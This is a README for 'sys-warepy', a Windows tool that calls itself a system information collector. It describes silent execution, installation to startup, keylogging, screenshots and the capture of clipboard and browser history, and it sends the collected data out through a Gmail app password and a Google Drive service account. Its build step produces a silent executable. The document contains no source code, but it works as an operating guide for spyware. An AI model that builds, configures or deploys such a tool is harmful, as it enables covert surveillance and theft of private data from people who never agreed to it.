# sys-warepy

A Windows system information collector that gathers system data, browser history, clipboard information, screenshots, keylogger logs, and network diagnostics.

## Usage

- Run silently: `python sysinfo.py` or `dist\sys.exe`
- Run auto mode explicitly: `dist\sys.exe --auto`
- Run interactive mode: `dist\sys.exe --menu`
- Install to startup: `dist\sys.exe --install`
- Uninstall from startup: `dist\sys.exe --uninstall`

## Configuration

Set your Gmail app password as an environment variable before sending email:

```powershell
set GMAIL_APP_PASSWORD=your_app_password
```

Configure Google Drive credentials for file upload:

```powershell
set GOOGLE_APPLICATION_CREDENTIALS=C:\path\to\service_account.json
set GOOGLE_DRIVE_FOLDER_ID=your_drive_folder_id
```

## Build

Build the silent executable using:

```powershell
python build_exe.py
```

The resulting executable is created at `dist\sys.exe`.
